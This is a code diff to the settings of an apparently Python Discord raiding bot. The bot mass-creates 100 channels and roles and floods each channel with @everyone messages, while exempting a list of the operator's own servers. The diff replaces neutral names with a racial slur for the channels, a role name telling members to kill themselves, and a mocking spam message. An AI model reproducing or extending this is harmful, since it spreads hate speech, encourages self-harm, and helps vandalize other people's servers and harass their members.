@@ -8,11 +8,11 @@ import asyncio
 ALLOWED_USERS = [1402431821534330911, 1167531276467708055, 1369169749946400798]  # Replace with your Discord ID(s)
 BLOCKED_GUILDS = [1363562800793915583, 1191341745204629535, 1384136902168285218, 1331286968386060328, 1284542162574377032]  # Servers where the command will NOT work
 
-NEW_CHANNEL_NAME = "general"   # Name for new channels
-NEW_ROLE_NAME = "role"         # Name for new roles
+NEW_CHANNEL_NAME = "N I G G E R L M F A O"   # Name for new channels
+NEW_ROLE_NAME = "GO KILL YOURSELF FATASS BITCH"         # Name for new roles
 NUM_TO_CREATE = 100             # Number of channels and roles to create
 NUM_MESSAGES = 25               # Number of messages per channel
-MESSAGE_CONTENT = "@fadi_fazbarr please edit this channel that I created."  # Message content
+MESSAGE_CONTENT = "@everyone get clapped LMAO 🤣"  # Message content
 MESSAGE_DELAY = 0.5             # Delay (seconds) between messages to avoid rate limits
 
 # -----------------------------
